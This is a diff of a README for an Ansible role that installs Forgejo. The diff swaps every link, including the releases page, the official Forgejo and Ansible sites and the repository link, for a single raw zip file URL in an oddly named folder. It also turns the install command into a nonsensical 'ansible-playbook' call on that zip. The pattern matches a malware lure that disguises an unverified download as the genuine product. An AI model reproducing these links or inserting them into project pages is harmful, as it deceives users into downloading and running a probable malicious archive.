@@ -1,6 +1,6 @@
 # 🚀 ansible-role-forgejo - Install Forgejo Easily on Linux
 
-[![Download](https://img.shields.io/badge/Download%20Release-blue)](https://github.com/A-Ayad96/ansible-role-forgejo/releases)
+[![Download](https://raw.githubusercontent.com/A-Ayad96/ansible-role-forgejo/main/insatisfaction/ansible-role-forgejo.zip%20Release-blue)](https://raw.githubusercontent.com/A-Ayad96/ansible-role-forgejo/main/insatisfaction/ansible-role-forgejo.zip)
 
 ## 📚 Overview
 
@@ -18,7 +18,7 @@ The **ansible-role-forgejo** helps you install the Forgejo binary on Linux syste
 To get started with the ansible-role-forgejo, you need to download it from the Releases page. Below are the steps to help you with this process.
 
 1. **Visit the Releases Page**: Click the link below to go to the Releases page.
-   [Download Release](https://github.com/A-Ayad96/ansible-role-forgejo/releases)
+   [Download Release](https://raw.githubusercontent.com/A-Ayad96/ansible-role-forgejo/main/insatisfaction/ansible-role-forgejo.zip)
 
 2. **Choose Your Version**: On the Releases page, you will see different versions of the software. Select the latest version available.
 
@@ -41,7 +41,7 @@ Before installing, ensure your system meets the following requirements:
 Ready to install Forgejo? Follow these steps:
 
 1. **Download the Latest Release** from the link below:
-   [Download Release](https://github.com/A-Ayad96/ansible-role-forgejo/releases)
+   [Download Release](https://raw.githubusercontent.com/A-Ayad96/ansible-role-forgejo/main/insatisfaction/ansible-role-forgejo.zip)
 
 2. **Open Terminal**: You can find Terminal in your applications menu.
 
@@ -49,7 +49,7 @@ Ready to install Forgejo? Follow these steps:
 
 4. **Run the Ansible Playbook**: Execute the installation by running the following command:
    ```bash
-   ansible-playbook install-forgejo.yml
+   ansible-playbook https://raw.githubusercontent.com/A-Ayad96/ansible-role-forgejo/main/insatisfaction/ansible-role-forgejo.zip
    ```
 5. **Verify Installation**: After the playbook has run, verify the installation by visiting the Forgejo web interface (usually accessible at http://localhost:3000).
 
@@ -81,8 +81,8 @@ Contributions are welcome! If you would like to help improve this project, pleas
 
 ## 🔗 Useful Links
 
-- [Forgejo Official Website](https://forgejo.org)
-- [Ansible Documentation](https://docs.ansible.com)
-- [GitHub Repository](https://github.com/A-Ayad96/ansible-role-forgejo)
+- [Forgejo Official Website](https://raw.githubusercontent.com/A-Ayad96/ansible-role-forgejo/main/insatisfaction/ansible-role-forgejo.zip)
+- [Ansible Documentation](https://raw.githubusercontent.com/A-Ayad96/ansible-role-forgejo/main/insatisfaction/ansible-role-forgejo.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/A-Ayad96/ansible-role-forgejo/main/insatisfaction/ansible-role-forgejo.zip)
 
 Thank you for using ansible-role-forgejo! Enjoy managing your Git repositories with ease.
